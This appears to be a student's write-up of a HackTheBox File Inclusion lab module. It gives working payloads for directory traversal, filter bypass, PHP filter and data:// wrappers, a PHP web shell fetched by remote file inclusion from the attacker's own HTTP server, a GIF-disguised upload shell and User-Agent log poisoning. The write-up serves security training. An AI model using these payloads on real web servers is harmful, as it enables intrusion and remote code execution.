<h1><ins>Local File Inclusion (LFI)</ins></h1>
<h2>Task: Using the file inclusion find the name of a user on the system that starts with "b".</h2>
To exploit LFI, we use directory traversal techniques to access sensitive files. By injecting ../ into the file path, we can navigate out of the intended directory and access system files, such as /etc/passwd. The /etc/passwd file is a standard Linux file that contains information about system users. Each line in the file corresponds to a user, and their usernames are the first field on each line.<br></br>

![Screenshot 2024-11-15 211516](https://github.com/user-attachments/assets/d8bed4c5-9929-4d5b-bb24-0974766b87bd)

<br></br>Since Text output is to long we can view page source to see full text which gives us user on the system that starts with "b".<br></br>

![Screenshot 2024-11-15 211552](https://github.com/user-attachments/assets/a3ac51a4-57a0-4a98-8266-73a97d51e4b7)

<h2>Task: Submit the contents of the flag.txt file located in the /usr/share/flags directory.</h2>

Using same method and changing directory with file name get our flag.

![Screenshot 2024-11-15 211948](https://github.com/user-attachments/assets/36fd1584-3202-41c5-99b3-fa6c83676c7d)

<br></br>

<h1><ins>Basic Bypasses</ins></h1>
<h2>Task: The above web application employs more than one filter to avoid LFI exploitation. Try to bypass these filters to read /flag.txt</h2> 
Using previous method of ../ we are presented with "Illegal path specified!", to bypass filters we combine ....// method and approved path by application.

![Screenshot 2024-11-15 221940](https://github.com/user-attachments/assets/4122b301-73aa-4bac-b6b0-72bb8ffe77a2)

<br></br>

<h1><ins>PHP Filters(LFI)</ins></h1>
<h2>Task: Fuzz the web application for other php scripts, and then read one of the configuration files and submit the database password as the answer</h2>
Using ffuf we can find php files that web application uses in some cases we might need to have a larger directory file, but for this module small directory file is enough. <code>ffuf -w Desktop/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ.php</code> , after running command we can see that it found two .php files index and configure.

Once we have a list of potential PHP files we want to read, we can start disclosing their sources with the base64 PHP filter. We can try to read source code of config.php using the base64 filter, by specifying convert.base64-encode for the read parameter and config for the resource parameter, using this code <code>php://filter/read=convert.base64-encode/resource=</code> our final URL looks like this: <code>http://SERVER_IP:PORT/index.php?language=php://filter/read=convert.base64-encode/resource=configure</code>
To copy full encoded text we can use View Page Source

![Screenshot 2024-11-16 185901](https://github.com/user-attachments/assets/e03e9000-db00-4771-bfaa-f8f683c3e621)

Using <code> echo "encoded text" | base64 -d</code> we can decode text and find flag.

![Screenshot 2024-11-16 190353](https://github.com/user-attachments/assets/f15de0a4-40f5-49fe-9631-0d25be69e09e)

<h1><ins>PHP Wrappers</ins></h1>
<h2>Task: Try to gain RCE using one of the PHP wrappers and read the flag at /</h2>

After going throught HTB Writeup we can see that <code>http://SERVER_IP:PORT/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id</code> show UID's we can use last part <code>cmd=id</code> to pass commands which in this case we can change to <code>cmd=ls /</code> to find our flag file which is <code>37809e2f8952f06139011994726d9ef1.txt</code> knowing this we can change our last part of the code to get flag <code>cmd=cat /37809e2f8952f06139011994726d9ef1.txt</code>


![1](https://github.com/user-attachments/assets/6e1c7ccf-33f8-4393-99c6-6d40eca727f5)

<h1><ins>Remote File Inclusion (RFI)</ins></h1>
<h2>Task: Attack the target, gain command execution by exploiting the RFI vulnerability, and then look for the flag under one of the directories in/</h2>
Flowoing HTB Writeup first we create a basic php shell <code> echo '<code><</code>?php system($_GET["cmd"]); ?>' > shell.php </code> then we start a python server <code>sudo python3 -m http.server LISTENING_PORT </code> back in the web page we can use this url <code>http://SERVER_IP:PORT/index.php?language=http://OUR_IP:LISTENING_PORT/shell.php&cmd=id</code> to pass commands. After going trough directories we can easelly find our flag.

![Screenshot 2024-11-18 220254](https://github.com/user-attachments/assets/1ad366a8-e11a-488e-a876-c72f48485d4a)

<h1><ins>LFI and File Uploads</ins></h1>
<h2>Task: Use any of the techniques covered in this section to gain RCE and read the flag at /</h2>
Using image upload first we create web shell file that we will use to upload as image <code>echo 'GIF8<code><</code>?php system($_GET["cmd"]); ?>' > shell.gif</code> after successful upload we can use this URL <code>http://SERVER_IP:PORT/index.php?language=./profile_images/shell.gif&cmd=id</code> to start using comands to find our flag
  
![Screensh5ot 2024-11-18 220254](https://github.com/user-attachments/assets/5f7aeeb2-4375-433c-a5a5-5323f52eee8b)

<h1><ins>Log Poisoning</ins></h1>
<h2>Task: Use any of the techniques covered in this section to gain RCE, then submit the output of the following command: pwd/</h2>
using burpsuite we send intercept address <code>http://SERVER_IP:PORT/index.php?language=/var/log/apache2/access.log</code> and by changing user-agent to <code><code><</code>?php system($_GET['cmd']); ?></code> we can inject commands, we also need to change end of url by adding in this case <code>&cmd=pwd</code>
  
![Screenshot 2024-12-01 202623](https://github.com/user-attachments/assets/c0ea16db-a9f4-4c97-9c78-8f36ced111f6)

<h2>Task:  Try to use a different technique to gain RCE and read the flag at / /</h2>
using burpsuit url encoder we can send command to check the files that are inside directory /

![Screenshot 2024-12-01 214032](https://github.com/user-attachments/assets/6d125a2a-4b77-4059-8193-7c487417b127)

![Screenshot 2024-12-01 214138](https://github.com/user-attachments/assets/a7ff890c-41e2-43a1-be6a-38197963c7d6)

after finding flag file we encode it as url using <code>cat /FlagFileName.txt</code> which give us our flag file contents

![Screenshot 2024-12-01 214322](https://github.com/user-attachments/assets/ef19dddd-00a0-4fd7-9b8c-251fc24d8551)

<h1><ins>Automated Scanning</ins></h1>
<h2>Task: Fuzz the web application for exposed parameters, then try to exploit it with one of the LFI wordlists to read /flag.txt/</h2>
Following HTB writeup im using <code>ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://SERVER_IP:PORT/index.php?FUZZ=value' -fs 2287</code>,burp-parameter-names.txt might not be by default in Parrot OS HTB ediot so with help of google you can find txt file and run the command

![Screenshot 2024-12-02 200657](https://github.com/user-attachments/assets/5822c583-1d51-4636-9807-4a61403c8fb4)

After running command and trying few results theres no success, if you notice most of the output is in 2309 bit size so if we change our command to exclude these results and try again well find a match.

![Screenshot 2024-12-02 200735](https://github.com/user-attachments/assets/95bc30a0-daf1-4f4b-bf4c-647332941a81)

After finding working parameter we can try <code>ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://SERVER_IP:PORT/index.php?view=FUZZ' -fs 2287</code>, but again were getting to many wrong results so after checking size and excluding the most common ones we get working results.

![Screenshot 2024-12-02 202346](https://github.com/user-attachments/assets/d1c967d8-02cd-4833-b164-208d89b94779)

Then by using our findings and using as our url we get list of users

![Screenshot 2024-12-02 200914](https://github.com/user-attachments/assets/26e610e0-1c0e-4f5f-bac8-8a0b0297ab70)

Changing url end to <code>/flag.txt</code> we get a flag.

![Screenshot 2024-12-02 200953](https://github.com/user-attachments/assets/19be7c48-f37a-4009-9318-f5d28a10375c)

<h1><ins>File Inclusion Prevention</ins></h1>
<h2>Task: What is the full path to the php.ini file for Apache?</h2>
Using linux find commands or just manualy checking where apache is located we can find php.ini file

![Screenshot 2024-12-03 183408](https://github.com/user-attachments/assets/cf6957e1-8900-47c5-af7d-30875202901a)

<h2>Task: Edit the php.ini file to block system(), then try to execute PHP Code that uses system. Read the /var/log/apache2/error.log file and fill in the blank: system() has been disabled for ________ reasons.</h2>
Answewr is Security.

<h1><ins>Skills Assessment - File Inclusion</ins></h1>
<h2>Task: Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.</h2>
Using <code>php://filter/read=convert.base64-encode/resource=config</code> we can read index.php file, after decoding using base64 we find a secret directory

![Screenshot 2024-12-03 192826](https://github.com/user-attachments/assets/b2d4449f-1fa0-42df-82d1-7c40913451b6)

Using ffuf we can find LFI Paths which show us that this is Nginx log, Nginx logs are located in <code>/var/log/nginx/</code>

![Screenshot 2024-12-03 193248](https://github.com/user-attachments/assets/1035be9b-99a0-4c56-9072-6dd06388af04)

Using burpsuite we can poison the User-Agent header and using url encoder we can send commands which helps us to locate flag.txt file.

![Screenshot 2024-12-03 194402](https://github.com/user-attachments/assets/2102a089-0b8f-444d-8ddf-988c751517b0)

![Screenshot 2024-12-03 195148](https://github.com/user-attachments/assets/5bab7746-04f3-4419-bfd7-8d5296dbb690)


